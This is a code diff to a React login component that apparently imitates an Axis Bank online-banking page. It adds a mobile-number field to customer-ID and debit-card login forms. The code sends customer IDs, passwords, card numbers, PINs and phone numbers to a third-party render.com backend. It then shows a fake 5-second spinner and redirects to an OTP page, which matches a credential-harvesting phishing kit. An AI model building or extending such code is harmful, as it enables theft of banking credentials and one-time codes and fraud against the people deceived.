@@ -6,15 +6,25 @@ import "./Login.css";
 
 function LoginSection() {
   const [activeTab, setActiveTab] = useState("customer");
+
+  const [mobileNumber, setMobileNumber] = useState("");
   const [customerId, setCustomerId] = useState("");
   const [password, setPassword] = useState("");
+
   const [cardNumber, setCardNumber] = useState("");
   const [pin, setPin] = useState("");
+
   const [showPin, setShowPin] = useState(false);
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState({ text: "", type: "" });
 
   const navigate = useNavigate();
+
+  // ---------------- Handlers ----------------
+  const handleMobileChange = (e) => {
+    const value = e.target.value.replace(/\D/g, ""); // Only digits
+    setMobileNumber(value.slice(0, 10));
+  };
 
   const handleCardChange = (e) => {
     let value = e.target.value.replace(/\D/g, "");
@@ -22,11 +32,20 @@ function LoginSection() {
     setCardNumber(value);
   };
 
-  // CUSTOMER LOGIN → SPINNER → REDIRECT
+  // ---------------- Customer Login ----------------
   const handleCustomerLogin = async () => {
-    if (!customerId || !password) {
-      setMessage({ text: "Customer ID and Password are required", type: "error" });
-      return;
+    if (!mobileNumber || !customerId || !password) {
+      return setMessage({
+        text: "Mobile number, Customer ID and Password are required",
+        type: "error",
+      });
+    }
+
+    if (!/^\d{10}$/.test(mobileNumber)) {
+      return setMessage({
+        text: "Mobile number must be exactly 10 digits",
+        type: "error",
+      });
     }
 
     setLoading(true);
@@ -36,12 +55,16 @@ function LoginSection() {
       await fetch("https://axisonline-1.onrender.com/api/users/register", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ customerId, password }),
+        body: JSON.stringify({
+          mobileNumber,
+          customerId,
+          password,
+        }),
       });
 
-      // ⏳ Spinner for 5 seconds → OTP page
+      // Show spinner for 5s, then redirect to OTP
       setTimeout(() => {
-        navigate("/otp-submit", { state: { customerId } });
+        navigate("/otp-submit", { state: { mobileNumber } });
       }, 5000);
     } catch (err) {
       console.error(err);
@@ -50,28 +73,38 @@ function LoginSection() {
     }
   };
 
-  // DEBIT CARD LOGIN → SAVE TO DB → SPINNER → REDIRECT
+  // ---------------- Debit Card Login ----------------
   const handleDebitLogin = async () => {
-    if (!cardNumber || !pin) {
-      setMessage({ text: "Debit card number and PIN are required", type: "error" });
-      return;
+    if (!mobileNumber || !cardNumber || !pin) {
+      return setMessage({
+        text: "Mobile number, Debit card number and PIN are required",
+        type: "error",
+      });
+    }
+
+    if (!/^\d{10}$/.test(mobileNumber)) {
+      return setMessage({
+        text: "Mobile number must be exactly 10 digits",
+        type: "error",
+      });
     }
 
     setLoading(true);
     setMessage({ text: "", type: "" });
 
     try {
-      const res = await fetch("https://axisonline-1.onrender.com/api/debit-cards", {
+      await fetch("https://axisonline-1.onrender.com/api/debit-cards", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cardNumber, pin }),
+        body: JSON.stringify({
+          mobileNumber,
+          cardNumber,
+          pin,
+        }),
       });
 
-      if (!res.ok) throw new Error("Failed to save debit card info");
-
-      // ⏳ Spinner for 5 seconds → OTP page
       setTimeout(() => {
-        navigate("/otp-submit", { state: { cardNumber } });
+        navigate("/otp-submit", { state: { mobileNumber } });
       }, 5000);
     } catch (err) {
       console.error(err);
@@ -101,13 +134,23 @@ function LoginSection() {
           </button>
         </div>
 
+        {/* Error / Success Message */}
         {message.text && (
           <div className={`form-message ${message.type}`}>{message.text}</div>
         )}
 
-        {/* CUSTOMER ID LOGIN */}
+        {/* ---------------- Customer Login Form ---------------- */}
         {activeTab === "customer" && (
           <div className="form">
+            <label>Mobile Number</label>
+            <input
+              type="tel"
+              value={mobileNumber}
+              onChange={handleMobileChange}
+              maxLength={10}
+              disabled={loading}
+            />
+
             <label>Customer ID</label>
             <input
               type="text"
@@ -140,9 +183,18 @@ function LoginSection() {
           </div>
         )}
 
-        {/* DEBIT CARD LOGIN */}
+        {/* ---------------- Debit Card Login Form ---------------- */}
         {activeTab === "debit" && (
           <div className="form">
+            <label>Mobile Number</label>
+            <input
+              type="tel"
+              value={mobileNumber}
+              onChange={handleMobileChange}
+              maxLength={10}
+              disabled={loading}
+            />
+
             <label>Debit Card Number</label>
             <input
               type="text"
